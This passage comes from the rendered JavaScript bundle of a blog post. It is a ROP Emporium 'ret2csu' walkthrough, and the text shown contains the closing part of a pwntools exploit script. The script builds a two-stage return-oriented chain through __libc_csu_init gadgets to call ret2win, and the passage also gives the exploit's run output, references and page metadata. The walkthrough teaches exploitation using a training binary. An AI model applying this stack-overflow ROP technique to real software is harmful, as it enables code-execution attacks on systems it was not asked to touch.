#R15\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`stage1 += stage2_addr\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`stage1 += pwn.p64(0)*7   #adjust the stack\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`#stage2\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`'''\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`   \\u250C\\u2500\\u2500>     0x00400680      mov   rdx, r15\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\\u2502      \\u254E\\u2502   0x00400683      mov   rsi, r14\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\\u2502      \\u254E\\u2502   0x00400686      mov   edi, r13d\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\\u2502      \\u254E\\u2502   0x00400689      call  qword [r12 + rbx*8]\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`'''\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`stage2 = pop_rdi\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`stage2 +=arg1\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`stage2 +=ret2win_addr \n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`payload = b\"A\"*32\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`payload += b\"B\"*8\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`payload += b\"\" .join([\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`    stage1,\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`    stage2\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`    ])\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`io.writeafter('>', payload)\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`pwn.info(io.recvall().decode())\n`})]})}),(0,e.jsx)(a.p,{children:\"Running the exploit code above we get the correct flag\"}),(0,e.jsx)(a.pre,{className:\"language-bash\",children:(0,e.jsxs)(a.code,{className:\"code-highlight language-bash\",children:[(0,e.jsx)(a.span,{className:\"code-line\",children:`vx@archie:ret2csu$ python3 xpl.py \n`}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"[\"}),\"+\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"]\"}),\" Starting \",(0,e.jsx)(a.span,{className:\"token builtin class-name\",children:\"local\"}),\" process \",(0,e.jsx)(a.span,{className:\"token string\",children:\"'./ret2csu'\"}),(0,e.jsx)(a.span,{className:\"token builtin class-name\",children:\":\"}),\" pid \",(0,e.jsx)(a.span,{className:\"token number\",children:\"18869\"}),`\n`]}),(0,e.jsx)(a.span,{className:\"code-line\",children:`    Arch:     amd64-64-little\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`    RELRO:    Partial RELRO\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`    Stack:    No canary found\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`    NX:       NX enabled\n`}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"    PIE:      No PIE \",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"0x400000\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"    RUNPATH:  b\",(0,e.jsx)(a.span,{className:\"token string\",children:\"'.'\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"[\"}),\"+\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"]\"}),\" Receiving all data: Done \",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"45B\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"[\"}),\"*\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"]\"}),\" Process \",(0,e.jsx)(a.span,{className:\"token string\",children:\"'./ret2csu'\"}),\" stopped with \",(0,e.jsx)(a.span,{className:\"token builtin class-name\",children:\"exit\"}),\" code \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0\"}),\" \",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"pid \",(0,e.jsx)(a.span,{className:\"token number\",children:\"18869\"}),(0,e.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"[\"}),\"*\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"]\"}),\"  Thank you\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"!\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"    ROPE\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"{\"}),\"a_placeholder_32byte_flag\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"!\"}),(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"}\"}),`\n`]})]})}),(0,e.jsxs)(a.h2,{id:\"references\",children:[(0,e.jsx)(a.a,{href:\"#references\",\"aria-hidden\":\"true\",tabIndex:\"-1\",children:(0,e.jsx)(a.span,{className:\"icon icon-link\"})}),\"References\"]}),(0,e.jsxs)(a.ol,{children:[(0,e.jsx)(a.li,{children:(0,e.jsx)(a.a,{href:\"https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf\",children:\"Universal ROP or Return-to-csu\"})}),(0,e.jsx)(a.li,{children:(0,e.jsx)(a.a,{href:\"http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html\",children:\"Linux program startup\"})})]})]})}}var w=f;function _(n,s){throw new Error(\"Expected \"+(s?\"component\":\"object\")+\" `\"+n+\"` to be defined: you likely forgot to import, pass, or provide it.\")}return x(y);})();\n;return Component;","toc":[{"value":"Introduction","url":"#introduction","depth":2},{"value":"pwnme Disassembly","url":"#pwnme-disassembly","depth":2},{"value":"libc_csu_init Disassembly","url":"#libc_csu_init-disassembly","depth":2},{"value":"Exploit","url":"#exploit","depth":2},{"value":"References","url":"#references","depth":2}],"frontMatter":{"readingTime":{"text":"17 min read","minutes":16.685,"time":1001100,"words":3337},"slug":"ropemporium-ret2csu","fileName":"ropemporium-ret2csu.mdx","title":"Return-Oriented Programming - Retcsu","date":"2021-12-20","tags":["ropemporium","rop","pwn"],"draft":true,"summary":"Learn a ROP technique that lets you populate useful calling convention registers like rdi, rsi and rdx even in an environment where gadgets are sparse.","layout":"PostLayout","canonicalUrl":null}},"authorDetails":[{"readingTime":{"text":"1 min read","minutes":0.54,"time":32400,"words":108},"slug":["default"],"fileName":"default.md","name":"Martin Muthuri","avatar":"/static/images/avatar.png","occupation":"Software Developer","email":"thuri783@gmail.com","twitter":"https://twitter.com/0xhexski","github":"https://github.com/thuri10"}],"prev":{"title":"RedLineStealer Information Stealer Analysis","date":"2022-02-07T00:00:00.000Z","tags":["malware","RedlineStealer"],"draft":false,"summary":"Redline malware is an Information Stealer written in c# , targeting windows victims. It is used for gathering victims information ranging from the Browser cookies, saved credentials, Discord tokens...","images":[],"layout":"PostLayout","canonicalUrl":null,"slug":"redlinerstealer"},"next":null},"__N_SSG":true}